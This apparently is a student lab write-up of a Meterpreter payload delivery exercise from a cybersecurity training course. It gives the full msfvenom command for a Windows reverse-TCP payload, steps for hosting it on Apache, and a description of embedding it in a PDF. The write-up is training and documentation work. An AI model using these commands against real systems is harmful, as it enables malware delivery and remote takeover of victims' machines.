# Meterpreter Payload Delivery Workflow

## Overview

[svg](https://github.com/adeel635/Penetration-Testing-Lab-Writeups/blob/main/meterpreter-payload-delivery-workflow.md#overview)

A controlled-lab security exercise documenting the preparation and delivery workflow of a Windows Meterpreter reverse-TCP payload. The practical covers payload generation, Apache-based file hosting, victim-side retrieval, and preparation of a PDF-based delivery artifact.

The source material confirms the workflow, but it does not provide evidence of a completed exploitation/session result or document the exact mechanism used to embed the payload into the PDF.

## Objective

[svg](https://github.com/adeel635/Penetration-Testing-Lab-Writeups/blob/main/meterpreter-payload-delivery-workflow.md#objective)

Document the controlled-laboratory procedure used to generate a Windows payload, host it through Apache, retrieve it from the victim machine, and incorporate the payload into a PDF-based artifact while recording the available technical evidence.

## Lab Environment

[svg](https://github.com/adeel635/Penetration-Testing-Lab-Writeups/blob/main/meterpreter-payload-delivery-workflow.md#lab-environment)

- **Assessment Type:** Controlled educational lab practical
- **Referenced Payload Host:** `192.168.88.246`
- **Payload Type:** Windows Meterpreter reverse TCP
- **Payload File:** `payload.exe`
- **Server Component:** Apache2
- **Setting:** Educational / Controlled Lab Environment
- **Training Context:** NAVTTC-funded cybersecurity training, Corvit Institute, Rawalpindi

## Tools Used

[svg](https://github.com/adeel635/Penetration-Testing-Lab-Writeups/blob/main/meterpreter-payload-delivery-workflow.md#tools-used)

`msfvenom` · `Meterpreter` · `Apache2` · `PDF artifact preparation`

## Methodology & Results

[svg](https://github.com/adeel635/Penetration-Testing-Lab-Writeups/blob/main/meterpreter-payload-delivery-workflow.md#methodology--results)

| **#** | **Stage** | **Command / Action** | **Result / Finding** |
|---:|---|---|---|
| 1 | Payload generation | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.88.246 LPORT=2222 -f exe -o payload.exe` | Windows Meterpreter reverse-TCP payload generated as `payload.exe`. |
| 2 | Payload hosting | `mv payload.exe /var/www/html` | Generated payload moved to the Apache web root. |
| 3 | Web server startup | `service apache2 start` | Apache2 service started for payload hosting. |
| 4 | Service verification | `service apache2 status` | Apache2 status checked after startup. |
| 5 | Victim-side delivery | Payload downloaded on the victim machine | Source material states that the generated malware was downloaded; exact URL, browser, timestamp, and download method are not documented. |
| 6 | PDF artifact preparation | Payload incorporated into a PDF-based artifact | Source material states that the payload was injected into the PDF, but the exact embedding mechanism is not documented. |
| 7 | Final PDF creation | PDF images and icon added; final PDF created | A final PDF-based delivery artifact was produced according to the submitted material. |
| 8 | Exploitation/session result | Not documented | No final exploitation or Meterpreter session result is evidenced in the source material. |

## Key Findings

[svg](https://github.com/adeel635/Penetration-Testing-Lab-Writeups/blob/main/meterpreter-payload-delivery-workflow.md#key-findings)

- The practical demonstrates a complete **malware-delivery workflow** in a controlled environment, beginning with payload generation and continuing through web hosting, victim-side retrieval, and PDF artifact preparation.
- The payload was configured as a **Windows Meterpreter reverse-TCP** executable using `192.168.88.246` as the listener host and TCP port `2222`.
- **Apache2** was used as the server component to host `payload.exe` from the web root.
- The source material confirms victim-side retrieval and PDF-based delivery, but it does **not** document the exact download mechanism, PDF embedding technique, or a completed Meterpreter session.

## Security Impact

[svg](https://github.com/adeel635/Penetration-Testing-Lab-Writeups/blob/main/meterpreter-payload-delivery-workflow.md#security-impact)

If performed against an unauthorized system, a workflow of this type could facilitate malware delivery and potentially provide remote access to a compromised host. In the submitted context, the activity is described as an educational practical and no unauthorized target is identified.

## Recommendations

[svg](https://github.com/adeel635/Penetration-Testing-Lab-Writeups/blob/main/meterpreter-payload-delivery-workflow.md#recommendations)

- Do not execute unknown or untrusted executable content.
- Use endpoint protection and application controls to detect and block suspicious payloads.
- Restrict unnecessary outbound connections from endpoints.
- Inspect suspicious PDF attachments and downloaded executables in a controlled sandbox.
- Maintain security awareness and attachment-handling procedures.
- Perform malware-delivery testing only in authorized, isolated environments.

## What I Learned

[svg](https://github.com/adeel635/Penetration-Testing-Lab-Writeups/blob/main/meterpreter-payload-delivery-workflow.md#what-i-learned)

This practical demonstrated the relationship between payload generation, web-based file hosting, victim-side delivery, and malicious document preparation. It also reinforced the importance of documenting each stage with clear technical evidence when conducting security exercises.

## Evidence

[svg](https://github.com/adeel635/Penetration-Testing-Lab-Writeups/blob/main/meterpreter-payload-delivery-workflow.md#evidence)

The submitted PDF contains the visual evidence associated with the workflow, including source pages covering payload generation, hosting, delivery, and PDF artifact preparation.

Full report: [meterpreter-payload-delivery-workflow.pdf](meterpreter-payload-delivery-workflow.pdf)

## Environment Disclaimer

[svg](https://github.com/adeel635/Penetration-Testing-Lab-Writeups/blob/main/meterpreter-payload-delivery-workflow.md#environment-disclaimer)

All activity described in this writeup is framed as an educational / controlled laboratory exercise. The report is based solely on the submitted practical material. No claim of testing against an unauthorized production system is made.
